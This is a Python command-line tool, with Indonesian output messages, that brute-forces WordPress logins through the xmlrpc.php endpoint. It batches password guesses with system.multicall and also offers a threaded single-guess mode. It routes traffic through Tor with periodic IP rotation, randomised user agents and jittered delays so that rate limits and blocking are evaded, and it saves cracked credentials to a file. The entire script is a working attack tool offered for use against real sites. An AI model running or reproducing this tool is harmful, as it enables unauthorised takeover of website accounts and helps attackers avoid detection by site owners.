#!/usr/bin/env python3
import requests
import random
import time
import argparse
import threading
from stem import Signal
from stem.control import Controller
from termcolor import colored

# =========================== CONFIG ===========================
tor_proxy = {
    'http': 'socks5h://127.0.0.1:9050',
    'https': 'socks5h://127.0.0.1:9050'
}
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)", "Mozilla/5.0 (X11; Linux x86_64)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)", "Mozilla/5.0 (iPhone; CPU iPhone OS 13_5_1)",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0)", "curl/8.14.1"
]
# ===============================================================

def print_logo():
    print(colored(r"""
 __        __   _ _      _   _      _                 _ 
 \ \      / /__| | | ___| | | |_ __(_)_   _____ _ __ | |
  \ \ /\ / / _ \ | |/ _ \ | | | '__| \ \ / / _ \ '_ \| |
   \ V  V /  __/ | |  __/ |_| | |  | |\ V /  __/ | | |_|
    \_/\_/ \___|_|_|\___|\___/|_|  |_| \_/ \___|_| |_(_)
        XML-RPC Bruteforce | by OfficialMarz57
""", 'cyan'))

def renew_tor_ip():
    with Controller.from_port(port=9051) as controller:
        controller.authenticate()
        controller.signal(Signal.NEWNYM)

def get_ip():
    try:
        r = requests.get('http://icanhazip.com', proxies=tor_proxy, timeout=10)
        return r.text.strip()
    except:
        return "Tidak bisa ambil IP"

def detect_methods(url):
    payload = """<?xml version="1.0"?>
<methodCall>
<methodName>system.listMethods</methodName>
<params></params>
</methodCall>"""
    headers = {'Content-Type': 'text/xml', 'User-Agent': random.choice(user_agents)}
    try:
        r = requests.post(url, data=payload, headers=headers, proxies=tor_proxy, timeout=15)
        if "wp.getUsersBlogs" in r.text:
            print(colored("[✔] XML-RPC aktif & method tersedia", 'green'))
        else:
            print(colored("[!] XML-RPC aktif tapi method dibatasi atau diblock", 'yellow'))
    except Exception as e:
        print(colored(f"[!] Gagal deteksi xmlrpc.php: {e}", 'red'))

def build_multicall_payload(username, passwords):
    entries = ""
    for pwd in passwords:
        entries += f"""
        <value>
            <struct>
                <member><name>methodName</name>
                    <value><string>wp.getUsersBlogs</string></value></member>
                <member><name>params</name>
                    <value><array><data>
                        <value><array><data>
                            <value><string>{username}</string></value>
                            <value><string>{pwd}</string></value>
                        </data></array></value>
                    </data></array></value>
            </struct>
        </value>"""
    return f"""<?xml version="1.0"?>
<methodCall>
<methodName>system.multicall</methodName>
<params><param><value><array><data>{entries}</data></array></value></param></params>
</methodCall>"""

def single_payload(username, password):
    return f"""<?xml version="1.0"?>
<methodCall>
<methodName>wp.getUsersBlogs</methodName>
<params>
<param><value><string>{username}</string></value></param>
<param><value><string>{password}</string></value></param>
</params>
</methodCall>"""

def try_batch_multicall(url, username, batch):
    headers = {'Content-Type': 'text/xml', 'User-Agent': random.choice(user_agents)}
    xml = build_multicall_payload(username, batch)
    try:
        r = requests.post(url, data=xml, headers=headers, proxies=tor_proxy, timeout=15)
        if r.status_code == 200:
            for pwd, response in zip(batch, r.text.split('<struct>')[1:]):
                print(f"🔍 {username}:{pwd}")
                if "isAdmin" in response or "blogid" in response:
                    print(colored(f"[+] Berhasil: {username}:{pwd}", 'green'))
                    with open("success.txt", "a") as out:
                        out.write(f"{username}:{pwd}\n")
                    return True
        else:
            print(colored(f"[!] Status HTTP {r.status_code}", 'yellow'))
    except Exception as e:
        print(colored(f"[!] Error: {e}", 'red'))
    return False

def try_single(url, username, password):
    headers = {'Content-Type': 'text/xml', 'User-Agent': random.choice(user_agents)}
    xml = single_payload(username, password)
    try:
        r = requests.post(url, data=xml, headers=headers, proxies=tor_proxy, timeout=15)
        print(f"🔍 {username}:{password}")
        if "isAdmin" in r.text or "blogid" in r.text:
            print(colored(f"[+] Berhasil: {username}:{password}", 'green'))
            with open("success.txt", "a") as out:
                out.write(f"{username}:{password}\n")
            return True
    except Exception as e:
        print(colored(f"[!] Error: {e}", 'red'))
    return False

def brute_force(url, username, wordlist_path, mode, threads):
    with open(wordlist_path, 'r') as f:
        passwords = [line.strip() for line in f if line.strip()]

    print(colored(f"🌐 IP Publik via TOR: {get_ip()}", 'blue'))

    if mode == "multicall":
        batch_size = 5
        for i in range(0, len(passwords), batch_size):
            batch = passwords[i:i+batch_size]
            print(f"\n🔁 Batch {i//batch_size+1}: {batch}")
            success = try_batch_multicall(url, username, batch)
            if success:
                break
            if (i//batch_size+1) % 3 == 0:
                renew_tor_ip()
                time.sleep(5)
                print(colored(f"🌐 IP Baru: {get_ip()}", 'cyan'))
            time.sleep(random.uniform(1.5, 4.0))
    elif mode == "single":
        def worker(pwd):
            if try_single(url, username, pwd):
                os._exit(0)
            time.sleep(random.uniform(1.5, 4.0))

        threads_list = []
        for pwd in passwords:
            t = threading.Thread(target=worker, args=(pwd,))
            threads_list.append(t)
            t.start()
            if len(threads_list) >= threads:
                for x in threads_list: x.join()
                threads_list.clear()
                renew_tor_ip()
                print(colored(f"🔄 Ganti IP TOR...", 'cyan'))
                print(colored(f"🌐 IP Baru: {get_ip()}", 'cyan'))

# ========================== CLI =============================
if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Bruteforce WordPress XML-RPC with TOR')
    parser.add_argument('-u', '--url', required=True, help='Target XML-RPC URL')
    parser.add_argument('-U', '--username', required=True, help='Username to attack')
    parser.add_argument('-w', '--wordlist', required=True, help='Path to wordlist file')
    parser.add_argument('-m', '--mode', choices=['single', 'multicall'], default='multicall', help='Brute mode')
    parser.add_argument('-t', '--threads', type=int, default=3, help='Threads for single mode')

    args = parser.parse_args()
    print_logo()
    detect_methods(args.url)
    brute_force(args.url, args.username, args.wordlist, args.mode, args.threads)
